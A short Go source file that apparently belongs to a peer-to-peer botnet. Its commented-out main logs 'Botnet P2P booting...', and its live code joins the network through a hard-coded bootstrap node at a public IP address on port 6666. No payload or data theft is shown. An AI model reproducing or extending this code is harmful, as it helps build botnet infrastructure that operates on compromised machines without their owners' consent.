package main

import (
	"fmt"
)

var defaultPort uint32 = 6666

var bootstrapNode = Node {
	host: "77.55.235.125",
	port: defaultPort,
	isNAT:false,
}

func RunApplication() {
	_, err := joinNetwork(bootstrapNode)
	if err != nil {
		fmt.Printf("Could not join network, error: %v\n", err)
	}
}

//func main() {
//	terminate := make(chan struct{})
//	log.Println("Botnet P2P booting...")
//	go exitHandler(terminate)
//	go clientRoutine(terminate)
//	serverRoutine(defaultPort, terminate)
//}
//
//func exitHandler(term chan struct{}) {
//	signalChannel := make(chan os.Signal, 3)
//	signal.Notify(signalChannel, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
//	<-signalChannel
//	close(term)
//	log.Println("Terminate signal received!")
//	//os.Exit(0)
//}